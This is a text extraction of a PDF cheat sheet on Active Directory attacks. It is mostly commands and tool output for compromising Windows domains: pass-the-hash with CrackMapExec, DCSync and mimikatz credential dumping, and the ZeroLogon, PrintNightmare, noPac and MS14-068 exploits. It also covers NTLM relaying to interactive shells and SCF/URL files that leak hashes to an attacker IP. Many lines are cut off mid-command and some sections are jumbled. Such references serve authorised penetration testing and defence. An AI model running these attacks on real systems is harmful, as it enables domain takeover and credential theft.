@@ -1,0 +1,1545 @@
+=== Active Directory Attacks.pdf ===
+Total Pages: 102
+============================================================
+
+Active Directory Attacks
+Summary
+Active Directory Attacks
+Summary
+Tools
+Kerberos Clock Synchronization
+Active Directory Recon
+Using BloodHound
+Using PowerView
+Using AD Module
+From CVE to SYSTEM shell on DC
+MS14-068 Checksum Validation
+ZeroLogon
+PrintNightmare
+samAccountName spoofing
+Open Shares
+SCF and URL file attack against writeable share
+SCF Files
+URL Files
+Windows Library Files
+Windows Search Connectors Files
+Passwords in SYSVOL & Group Policy Preferences
+Exploit Group Policy Objects GPO
+Find vulnerable GPO
+Abuse GPO with SharpGPOAbuse
+Abuse GPO with PowerGPOAbuse
+Abuse GPO with pyGPOAbuse
+Abuse GPO with PowerView
+Abuse GPO with StandIn
+Dumping AD Domain Credentials
+DCSync Attack
+Volume Shadow Copy
+
+Extract hashes from ntds.dit
+Using Mimikatz sekurlsa
+Crack NTLM hashes with hashcat
+NTDS Reversible Encryption
+User Hunting
+Password spraying
+Kerberos pre-auth bruteforcing
+Spray a pre-generated passwords list
+Spray passwords against the RDP service
+BadPwdCount attribute
+Password in AD User comment
+Password of Pre-Created Computer Account
+Reading LAPS Password
+Reading GMSA Password
+Forging Golden GMSA
+Kerberos Tickets
+Dump Kerberos Tickets
+Replay Kerberos Tickets
+Convert Kerberos Tickets
+Pass-the-Ticket Golden Tickets
+Using Mimikatz
+Using Meterpreter
+Using a ticket on Linux
+Pass-the-Ticket Silver Tickets
+Pass-the-Ticket Diamond Tickets
+Pass-the-Ticket Sapphire Tickets
+Kerberoasting
+KRB_AS_REP Roasting
+CVE-2022-33679
+Timeroasting
+Pass-the-Hash
+OverPass-the-Hash (pass the key)
+Using impacket
+Using Rubeus
+Capturing and cracking Net-NTLMv1/NTLMv1 hashes
+
+Capturing and cracking Net-NTLMv2/NTLMv2 hashes
+Man-in-the-Middle attacks & relaying
+MS08-068 NTLM reflection
+LDAP signing not required and LDAP channel binding disabled
+SMB Signing Disabled and IPv4
+SMB Signing Disabled and IPv6
+Drop the MIC
+Ghost Potato - CVE-2019-1384
+RemotePotato0 DCOM DCE RPC relay
+DNS Poisonning - Relay delegation with mitm6
+Relaying with WebDav Trick
+Active Directory Certificate Services
+ESC1 - Misconfigured Certificate Templates
+ESC2 - Misconfigured Certificate Templates
+ESC3 - Misconfigured Enrollment Agent Templates
+ESC4 - Access Control Vulnerabilities
+ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+ESC7 - Vulnerable Certificate Authority Access Control
+ESC8 - AD CS Relay Attack
+ESC9 - No Security Extension
+ESC11 - Relaying NTLM to ICPR
+Certifried CVE-2022-26923
+Pass-The-Certificate
+UnPAC The Hash
+Shadow Credentials
+Active Directory Groups
+Dangerous Built-in Groups Usage
+Abusing DNS Admins Group
+Abusing Schema Admins Group
+Abusing Backup Operators Group
+Active Directory Federation Services
+ADFS - Golden SAML
+Active Directory Integrated DNS
+Abusing Active Directory ACLs/ACEs
+GenericAll
+
+GenericWrite
+GenericWrite and Remote Connection Manager
+WriteDACL
+WriteOwner
+ReadLAPSPassword
+ReadGMSAPassword
+ForceChangePassword
+DCOM Exploitation
+DCOM via MMC Application Class
+DCOM via Excel
+DCOM via ShellExecute
+Trust relationship between domains
+Child Domain to Forest Compromise - SID Hijacking
+Forest to Forest Compromise - Trust Ticket
+Privileged Access Management (PAM) Trust
+Kerberos Unconstrained Delegation
+SpoolService Abuse with Unconstrained Delegation
+MS-EFSRPC Abuse with Unconstrained Delegation
+Kerberos Constrained Delegation
+Kerberos Resource Based Constrained Delegation
+Kerberos Service for User Extension
+S4U2self - Privilege Escalation
+Kerberos Bronze Bit Attack - CVE-2020-17049
+PrivExchange attack
+SCCM Deployment
+SCCM Network Access Accounts
+SCCM Shares
+WSUS Deployment
+RODC - Read Only Domain Controller
+RODC Golden Ticket
+RODC Key List Attack
+RODC Computer Object
+PXE Boot image attack
+DSRM Credentials
+DNS Reconnaissance
+
+Linux Active Directory
+CCACHE ticket reuse from /tmp
+CCACHE ticket reuse from keyring
+CCACHE ticket reuse from SSSD KCM
+CCACHE ticket reuse from keytab
+Extract accounts from /etc/krb5.keytab
+Extract accounts from /etc/sssd/sssd.conf
+References
+Tools
+Impacket or the Windows version
+Responder
+InveighZero
+Mimikatz
+Ranger
+AdExplorer
+CrackMapExec
+Mitm6
+# use the latest release, CME is now a binary packaged will all its dependenc
+root@payload$ wget https://tinyurl.com/2yajgbrm/releases/download/v5.0.1dev/cm
+# execute cme (smb, winrm, mssql, ...)
+root@payload$ cme smb -L
+root@payload$ cme smb -M name_module -o VAR=DATA
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294
+root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimi
+root@payload$ cme mimikatz --server http --server-port 80
+
+ADRecon
+.\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
+Active Directory Assessment and Privilege Escalation Script
+powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
+Ping Castle
+Kerbrute
+./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
+Rubeus
+AutomatedLab
+git clone https://tinyurl.com/2c78r5xf && cd mitm6
+pip install .
+mitm6 -d lab.local
+ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
+# -wh: Server hosting WPAD file (Attacker’s IP)
+# -t: Target (You cannot relay credentials to the same device that you’re spoo
+# -i: open an interactive shell
+ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
+pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME>
+pingcastle.exe --healthcheck --server domain.local
+pingcastle.exe --graph --server domain.local
+pingcastle.exe --scanner scanner_name --server domain.local
+available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_b
+Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES2
+Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+Rubeus.exe klist [/luid:LOGINID]
+Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DO
+New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
+Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 20
+
+Kerberos Clock Synchronization
+In Kerberos, time is used to ensure that tickets are valid. To achieve this, the clocks of all
+Kerberos clients and servers in a realm must be synchronized to within a certain tolerance. The
+default clock skew tolerance in Kerberos is 5 minutes , which means that the difference in time
+between the clocks of any two Kerberos entities should be no more than 5 minutes.
+Detect clock skew automatically with nmap
+Compute yourself the difference between the clocks
+nmap -sT 10.10.10.10 -p445 --script smb2-time -vv
+Fix #1: Modify your clock
+sudo date -s "14 APR 2015 18:25:16" # Linux
+net time /domain /set # Windows
+Fix #2: Fake your clock
+faketime -f '+8h' date
+Active Directory Recon
+Using BloodHound
+Use the correct collector
+AzureHound for Azure Active Directory
+SharpHound for local Active Directory
+RustHound for local Active Directory
+use BloodHoundAD/AzureHound (more info: Cloud - Azure Pentest)
+Install-Lab
+Show-LabDeploymentSummary
+$ nmap -sV -sC 10.10.10.10
+clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05
+
+Then import the zip/json files into the Neo4J database and query them.
+You can add some custom queries like :
+Bloodhound-Custom-Queries from @hausec
+BloodHoundQueries from CompassSecurity
+BloodHound Custom Queries from Exegol - @ShutdownRepo
+Certipy BloodHound Custom Queries from ly4k
+Replace the customqueries.json file located at
+/home/username/.config/bloodhound/customqueries.json  or
+C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json .
+Using PowerView
+Get Current Domain: Get-NetDomain
+Enum Other Domains: Get-NetDomain -Domain <DomainName>
+Get Domain SID: Get-DomainSID
+Get Domain Policy:
+Get Domain Controlers:
+Get-NetDomainController
+Get-NetDomainController -Domain <DomainName>
+root@payload$ apt install bloodhound 
+# start BloodHound and the database
+root@payload$ neo4j console
+# or use docker
+root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound n
+root@payload$ ./bloodhound --no-sandbox
+Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
+Get-DomainPolicy
+#Will show us the policy configurations of the Domain about system access or 
+(Get-DomainPolicy)."system access"
+(Get-DomainPolicy)."kerberos policy"
+
+Enumerate Domain Users:
+Enum Domain Computers:
+Get-NetComputer -FullData
+Get-DomainGroup
+#Enumerate Live machines 
+Get-NetComputer -Ping
+Enum Groups and Group Members:
+Enumerate Shares
+Get-NetUser
+Get-NetUser -SamAccountName <user> 
+Get-NetUser | select cn
+Get-UserProperty
+#Check last password change
+Get-UserProperty -Properties pwdlastset
+#Get a specific "string" on a user's attribute
+Find-UserField -SearchField Description -SearchTerm "wtver"
+#Enumerate user logged on a machine
+Get-NetLoggedon -ComputerName <ComputerName>
+#Enumerate Session Information for a machine
+Get-NetSession -ComputerName <ComputerName>
+#Enumerate domain machines of the current/specified domain where specific use
+Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, Session
+Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
+#Enumerate the members of a specified group of the domain
+Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
+#Returns all GPOs in a domain that modify local group memberships through Rest
+Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+
+#Enumerate Domain Shares
+Find-DomainShare
+#Enumerate Domain Shares the current user has access
+Find-DomainShare -CheckShareAccess
+Enum Group Policies:
+Get-NetGPO
+# Shows active Policy on specified machine
+Get-NetGPO -ComputerName <Name of the PC>
+Get-NetGPOGroup
+#Get users that are part of a Machine's local Admin group
+Find-GPOComputerAdmin -ComputerName <ComputerName>
+Enum OUs:
+Get-NetOU -FullData 
+Get-NetGPO -GPOname <The GUID of the GPO>
+Enum ACLs:
+# Returns the ACLs associated with the specified account
+Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
+Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
+#Search for interesting ACEs
+Invoke-ACLScanner -ResolveGUIDs
+#Check the ACLs associated with a specified path (e.g smb share)
+Get-PathAcl -Path "\\Path\Of\A\Share"
+Enum Domain Trust:
+Get-NetDomainTrust
+Get-NetDomainTrust -Domain <DomainName>
+Enum Forest Trust:
+
+Get-NetForestDomain
+Get-NetForestDomain Forest <ForestName>
+#Domains of Forest Enumeration
+Get-NetForestDomain
+Get-NetForestDomain Forest <ForestName>
+#Map the Trust of the Forest
+Get-NetForestTrust
+Get-NetDomainTrust -Forest <ForestName>
+User Hunting:
+:heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: 
+I have local admin access on a machine -> A Domain Admin has a session on that machine -
+> I steal his token and impersonate him ->
+Profit!
+PowerView 3.0 Tricks
+Using AD Module
+Get Current Domain: Get-ADDomain
+Enum Other Domains: Get-ADDomain -Identity <Domain>
+Get Domain SID: Get-DomainSID
+Get Domain Controlers:
+#Finds all machines on the current domain where the current user has local adm
+Find-LocalAdminAccess -Verbose
+#Find local admins on all machines of the domain:
+Invoke-EnumerateLocalAdmin -Verbose
+#Find computers were a Domain Admin OR a specified user has a session
+Invoke-UserHunter
+Invoke-UserHunter -GroupName "RDPUsers"
+Invoke-UserHunter -Stealth
+#Confirming admin access:
+Invoke-UserHunter -CheckAccess
+
+Get-ADDomainController
+Get-ADDomainController -Identity <DomainName>
+Enumerate Domain Users:
+Enum Domain Computers:
+Get-ADComputer -Filter * -Properties *
+Get-ADGroup -Filter * 
+Enum Domain Trust:
+Get-ADTrust -Filter *
+Get-ADTrust -Identity <DomainName>
+Enum Forest Trust:
+Get-ADForest
+Get-ADForest -Identity <ForestName>
+#Domains of Forest Enumeration
+(Get-ADForest).Domains
+Enum Local AppLocker Effective Policy:
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+Other Interesting Commands
+Find Domain Controllers
+nslookup domain.com
+nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>.com
+nltest /dclist:domain.com
+Get-ADDomainController -filter * | Select-Object name
+Get-ADUser -Filter * -Identity <user> -Properties *
+#Get a specific "string" on a user's attribute
+Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | se
+
+gpresult /r
+$Env:LOGONSERVER 
+echo %LOGONSERVER%
+From CVE to SYSTEM shell on DC
+Sometimes you will find a Domain Controller without the latest patches installed, use the
+newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you
+can also try to elevate your privileges using one of the methods listed in Windows -
+Privilege Escalation
+MS14-068 Checksum Validation
+This exploit require to know the user SID, you can use rpcclient  to remotely get it or wmi  if
+you have an access on the machine.
+RPCClient
+rpcclient $> lookupnames john.smith
+john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
+WMI
+wmic useraccount get name,sid
+Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
+Guest          S-1-5-21-3415849876-833628785-5197346142-501   
+Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
+Guest          S-1-5-21-297520375-2634728305-5197346142-501   
+krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
+lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
+Powerview
+Convert-NameToSid high-sec-corp.localkrbtgt
+S-1-5-21-2941561648-383941485-1389968811-502
+CrackMapExec: crackmapexec ldap DC1.lab.local -u username -p password -k --
+get-sid
+Doc: https://tinyurl.com/29u5o4ld
+Generate a ticket with metasploit  or pykek
+
+Then use mimikatz  to load the ticket.
+mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
+Mitigations
+Ensure the DCPromo process includes a patch QA step before running DCPromo that
+checks for installation of KB3011780. The quick and easy way to perform this check is with
+PowerShell: get-hotfix 3011780
+ZeroLogon
+CVE-2020-1472
+White Paper from Secura : https://tinyurl.com/y5bq4aa6
+Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
+   Name      Current Setting                                Required  Description
+   ----      ---------------                                --------  -----------
+   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain 
+   PASSWORD  P@ssw0rd                                       yes       The Domain 
+   RHOSTS    10.10.10.10                                    yes       The target 
+   RPORT     88                                             yes       The target 
+   Timeout   10                                             yes       The TCP tim
+   USER      lambda                                         yes       The Domain 
+   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain 
+# Alternative download: https://tinyurl.com/26tnkp5u
+$ git clone https://tinyurl.com/yyhlsjdm
+$ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControle
+$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1
+$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-333581537
+$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.loc
+-1105
+  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
+  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
+  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
+  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
+  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
+  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
+  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
+  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
+  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!
+
+Exploit steps from the white paper
+1. Spoofing the client credential
+2. Disabling signing and sealing
+3. Spoofing a call
+4. Changing a computer's AD password to null
+5. From password change to domain admin
+6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service
+cve-2020-1472-exploit.py  - Python script from dirkjanm
+nccfsas  - .NET binary for Cobalt Strike's execute-assembly
+git clone https://tinyurl.com/2d4qq8tx
+# Check
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
+# Resetting the machine account password
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
+# Testing from a non Domain-joined machine
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
+  # Check (https://tinyurl.com/y2h27qku)
+  proxychains python3 zerologon_tester.py DC01 172.16.1.5
+  
+$ git clone https://tinyurl.com/2759zpmk/CVE-2020-1472.git
+# Activate a virtual env to install impacket
+$ python3 -m venv venv
+$ source venv/bin/activate
+$ pip3 install .
+  
+# Exploit the CVE (https://tinyurl.com/2759zpmk/CVE-2020-1472/blob/master/cve-
+proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
+# Find the old NT hash of the DC
+proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16
+# Restore password from secretsdump 
+# secretsdump will automatically dump the plaintext machine password (hex enco
+# when dumping the local registry secrets on the newest version
+python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hex
+deactivate
+
+# Now reset the password back
+Mimikatz  - 2.2.0 20200917 Post-Zerologon
+CrackMapExec  - only check
+crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
+A 2nd approach to exploit zerologon is done by relaying authentication.
+This technique, found by dirkjanm, requires more prerequisites but has the advantage of having
+no impact on service continuity. The following prerequisites are needed:
+A domain account
+One DC running the PrintSpooler  service
+Another DC vulnerable to zerologon
+ntlmrelayx  - from Impacket and any tool such as printerbug.py
+# Check if one DC is running the PrintSpooler service
+rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"
+privilege::debug
+# Check for the CVE
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$
+# Exploit the CVE and set the computer account's password to ""
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit
+# Execute dcsync to extract some hashes
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /auth
+# Pass The Hash with the extracted Domain Admin hash
+sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN
+# Use IP address instead of FQDN to force NTLM with Windows APIs 
+# Reset password to Waza1234/Waza1234/Waza1234/
+# https://tinyurl.com/qdf539r/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/m
+lsadump::postzerologon /target:10.10.10.10 /account:DC01$
+
+# Setup ntlmrelay in one shell
+ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
+#Trigger printerbug in 2nd shell
+python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
+PrintNightmare
+CVE-2021-1675 / CVE-2021-34527
+The DLL will be stored in C:\Windows\System32\spool\drivers\x64\3\ . The exploit will
+execute the DLL either from the local filesystem or a remote share.
+Requirements:
+Spooler Service enabled (Mandatory)
+Server with patches < June 2021
+DC with Pre Windows 2000 Compatibility  group
+Server with registry key HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows
+NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall  = (DWORD) 1
+Server with registry key
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\En
+ableLUA  = (DWORD) 0
+Detect the vulnerability:
+Impacket - rpcdump
+python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
+Protocol: [MS-RPRN]: Print System Remote Protocol
+It Was All A Dream
+Payload Hosting:
+The payload can be hosted on Impacket SMB server since PR #1109:
+python3 ./smbserver.py share /tmp/smb/
+git clone https://tinyurl.com/289fr2nm
+cd ItWasAllADream && poetry install && poetry shell
+itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
+docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
+
+Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):
+Using WebDav with SharpWebServer (Doesn't require admin rights):
+SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
+When using WebDav instead of SMB, you must add @[PORT]  to the hostname in the URI, e.g.:
+\\172.16.1.5@8888\Downloads\beacon.dll  WebDav client must be activated on exploited
+target. By default it is not activated on Windows workstations (you have to net start
+webclient ) and it's not installed on servers. Here is how to detect activated webdav:
+cme smb -u user -p password -d domain.local -M webdav [TARGET]
+Trigger the exploit:
+SharpNightmare
+Invoke-Nightmare
+Mimikatz v2.2.0-20210709+
+Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServe
+# require a modified Impacket: https://tinyurl.com/28ybxu9f
+python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\19
+python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\a
+## LPE
+SharpPrintNightmare.exe C:\addCube.dll
+## RCE using existing context
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32
+## RCE using runas /netonly
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System3
+## LPE only (PS1 + DLL)
+Import-Module .\cve-2021-1675.ps1
+Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by def
+Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "Azka
+Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+## LPE
+misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool
+
+PrintNightmare - @outflanknl
+Debug informations
+Error
+Message
+Debug
+0x5
+rpc_s_access_denied
+Permissions on the file in the SMB share
+0x525
+ERROR_NO_SUCH_USER
+The specified account does not exist.
+0x180
+unknown error code
+Share is not SMB2
+samAccountName spoofing
+During S4U2Self, the KDC will try to append a '$' to the computer name specified in the
+TGT, if the computer name is not found. An attacker can create a new machine account
+with the sAMAccountName set to a domain controller's sAMAccountName - without the '$'.
+For instance, suppose there is a domain controller with a sAMAccountName set to 'DC$'.
+An attacker would then create a machine account with the sAMAccountName set to 'DC'.
+The attacker can then request a TGT for the newly created machine account. After the TGT
+has been issued by the KDC, the attacker can rename the newly created machine account
+to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and
+request a ST to itself as any user. Since the machine account with the sAMAccountName
+set to 'DC' has been renamed, the KDC will try to find the machine account by appending a
+'$', which will then match the domain controller. The KDC will then issue a valid ST for the
+domain controller.
+Requirements
+MachineAccountQuota > 0
+Check for exploitation
+1. Check the MachineAccountQuota of the account
+## RCE
+misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authd
+PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional dom
+crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kd
+StandIn.exe --object ms-DS-MachineAccountQuota=*
+
+1. Check if the DC is vulnerable
+crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
+Exploitation
+1. Create a computer account
+2. Clear the controlled machine account servicePrincipalName  attribute
+3. (CVE-2021-42278) Change the controlled machine account sAMAccountName  to a Domain
+Controller's name without the trailing $
+4. Request a TGT for the controlled machine account
+5. Reset the controlled machine account sAMAccountName to its old value
+6. (CVE-2021-42287) Request a service ticket with S4U2self  by presenting the TGT
+impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-
+powermad@windows> . .\Powermad.ps1
+powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPla
+powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Pas
+sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledCompu
+impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledCompute
+powershell@windows> . .\Powerview.ps1
+powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=do
+# https://tinyurl.com/297pz672
+impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name
+powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledCompu
+impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.loca
+cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPas
+impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'C
+powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledCompu
+
+obtained before
+7. DCSync: KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt'
+-k -no-pass -dc-ip 'DomainController.domain.local'
+@'DomainController.domain.local'
+Automated exploitation:
+cube0x0/noPac - Windows
+Ridter/noPac - Linux
+WazeHell/sam-the-admin
+# https://tinyurl.com/248qapdk
+impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersona
+cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"
+noPac.exe scan -domain htb.local -user user -pass 'password123'
+noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb
+noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb
+python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0
+$ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
+[*] Selected Target dc.caltech.white                                          
+[*] Total Domain Admins 11                                                    
+[*] will try to impersonat gaylene.dreddy                                     
+[*] Current ms-DS-MachineAccountQuota = 10                                    
+[*] Adding Computer Account "SAMTHEADMIN-11$"                                 
+[*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                  
+[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzm
+[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=whit
+[*] SAMTHEADMIN-11$ sAMAccountName == dc                                      
+[*] Saving ticket in dc.ccache                                                
+[*] Resting the machine account to SAMTHEADMIN-11$                            
+[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                 
+[*] Using TGT from cache                                                      
+[*] Impersonating gaylene.dreddy                                              
+[*]     Requesting S4U2self                                                   
+[*] Saving ticket in gaylene.dreddy.ccache                                    
+[!] Launching semi-interactive shell - Careful what you execute               
+C:\Windows\system32>whoami                                                    
+nt authority\system 
+
+ly4k/Pachine
+Mitigations:
+KB5007247 - Windows Server 2012 R2
+KB5008601 - Windows Server 2016
+KB5008602 - Windows Server 2019
+KB5007205 - Windows Server 2022
+KB5008102
+KB5008380
+Open Shares
+Some shares can be accessible without authentication, explore them to find some juicy files
+ShawnDEvans/smbmap - a handy SMB enumeration tool
+smbmap -H 10.10.10.10                # null session
+smbmap -H 10.10.10.10 -R             # recursive listing
+smbmap -H 10.10.10.10 -u invaliduser # guest smb session
+smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
+byt3bl33d3r/pth-smbclient from path-toolkit
+SecureAuthCorp/smbclient from Impacket
+usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-
+              [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH
+              [domain/]username[:password]
+$ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0
+$ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impe
+$ export KRB5CCNAME=$PWD/administrator@domain.local.ccache
+$ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'
+pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" /
+pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" /
+ls  # list files
+cd  # move inside a folder
+get # download files
+put # replace a file
+
+smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share
+        Users           Disk
+use Sharename # select a Sharename
+cd Folder     # move inside a folder
+ls            # list files
+smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers
+smbclient -U username //10.0.0.1/SYSVOL
+smbclient //10.0.0.1/Share
+# Download a folder recursively
+smb: \> mask ""
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> lcd '/path/to/go/'
+smb: \> mget *
+SnaffCon/Snaffler - a tool for pentesters to help find delicious candy
+snaffler.exe -s - snaffler.log
+# Snaffle all the computers in the domain
+./Snaffler.exe -d domain.local -c <DC> -s
+# Snaffle specific computers
+./Snaffler.exe -n computer1,computer2 -s
+# Snaffle a specific directory
+./Snaffler.exe -i C:\ -s
+SCF and URL file attack against writeable share
+Theses attacks can be automated with Farmer.exe and Crop.exe
+
+SCF Files
+Drop the following @something.scf  file inside a share and start listening with Responder :
+responder -wrf --lm -v -I eth0
+[Shell]
+Command=2
+IconFile=\\10.10.10.10\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+Using crackmapexec :
+URL Files
+This attack also works with .url  files and responder -I eth0 -v .
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\10.10.10.10\%USERNAME%.icon
+IconIndex=1
+Windows Library Files
